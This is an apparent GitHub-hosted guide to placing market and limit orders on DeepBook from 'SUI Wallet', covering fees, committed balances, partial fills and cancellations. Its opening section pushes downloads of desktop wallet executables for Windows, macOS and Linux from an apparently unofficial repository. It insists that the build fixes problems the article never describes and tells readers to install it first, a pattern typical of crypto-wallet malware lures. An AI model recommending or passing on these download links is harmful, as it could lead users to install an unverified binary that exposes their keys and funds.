![SUI Wallet](assets/banner-article.png)

# Trading on DeepBook from SUI Wallet

Market and limit orders settle on chain through an order book, not an exchange account.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

DeepBook is an order book that lives on the chain, and the wallet is where the orders get signed: market
orders fill against what is resting, limit orders wait at a price you name. Every order, cancellation and
fill is a transaction, so each one costs a fee and each one is yours to approve.

## What an on-chain order book is

An order book is a list of resting buy and sell orders at different prices. DeepBook keeps that list in
contract state rather than on a company's server, which means the orders are visible to anyone and cannot be
quietly withdrawn by the operator.

That is the difference worth understanding. A centralised exchange holds your balance and matches internally;
here the balance is in your account until an order commits it, and the matching is done by code anyone can
read.

It also means the book has no customer service and no freeze button. A mistaken order is a fact about the chain within seconds, and the only way back is another order, not a support ticket.

## Market and limit orders

A market order takes the best available price immediately and may fill across several resting orders, so the
average price can be worse than the first one quoted. A limit order names a price and waits, filling only if
the market reaches it.

The trade-off is certainty against price. Market orders are certain to execute and uncertain in price; limit
orders are certain in price and may never execute. Which one is right depends on whether you are trading or
waiting.

## What placing an order does

Placing a limit order moves the committed balance onto the book, where it sits until it fills or is cancelled. That is why the spendable balance can drop while nothing has actually been bought or sold yet. Cancelling the order is the way back out.

Cancelling returns what was committed, as another transaction with its own fee. A resting order that nobody
cancels stays there, which is fine for a strategy and surprising for anyone who forgot.
[Approving transactions in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/approving-transactions-in-sui-wallet.md) covers reading the preview before each of these steps.

Partial fills are the case worth watching: an order for a large amount can fill in pieces at different prices, and each piece is a separate change to the account rather than one jump.

## Fees, twice over

There is the network fee for the transaction and the trading fee the book charges on a fill. They are separate, they are charged separately, and a small order can be dominated by the first rather than the second. Both are visible before you approve.

That is the arithmetic worth doing before a first trade. A trade whose expected gain is smaller than the two
fees together is a donation to the venue, however good the entry price looks.
[SUI Wallet transaction fees explained](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-wallet-transaction-fees-explained.md) covers what the network fee is made of and why failure does
not refund it.

A fill that happens in several pieces is charged per fill rather than per order in most books, which is another reason a large market order deserves the preview rather than a guess.

## Where the funds sit

While an order rests, the committed amount is in the book's control rather than in your spendable balance; it
is not gone, and it is not available for anything else. After a fill, the other side of the trade arrives in
the account, minus the fees.

That sequence explains a balance that looks wrong mid-trade. Nothing is missing; something is committed, and
the book is holding it until the order resolves.
[How to send SUI from your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/how-to-send-sui-from-your-wallet.md) is the transfer path, which is a different act from trading and
does not involve the book at all.

## Reading a trade afterwards

The order's state is the fact to check: filled, partially filled, resting or cancelled. A partially filled
order has moved part of the committed amount and returned the rest, which is the case that most often looks
like an error.

The current release from the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) is what these
screens are described from, and the [repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop)
records the changes between builds.

The account's object list is the other view worth knowing: a resting order sits there as an object like any other, so a balance that looks short can be checked against what is actually committed.

Fill prices are another thing worth recording, because the average can differ from the price you named even on a limit order that filled in pieces across several resting orders.

## FAQ

### How do I trade on DeepBook from SUI Wallet?

Choose the pair, choose market or limit, enter the amount, read the preview and approve. The order is a
transaction, and the book matches it against what is resting.

### What is the difference between a market and a limit order?

A market order fills immediately at whatever prices are available, possibly across several orders. A limit
order waits at your price, and may never fill at all.

### Why did my balance drop before anything was bought?

Because a resting limit order commits the amount to the book. Cancelling returns it, as another transaction
with its own fee.

### Can I cancel an order?

Yes, and cancellation is a transaction. An order that is not cancelled stays on the book until it fills.

### Is trading the same as swapping?

No. A swap is a single transaction against a pool; an order on a book can rest, partially fill, or never
execute. The fee structure differs too.

### Does DeepBook need a separate account?

No. The book uses the account you already have; there is nothing to fund separately and no second login.
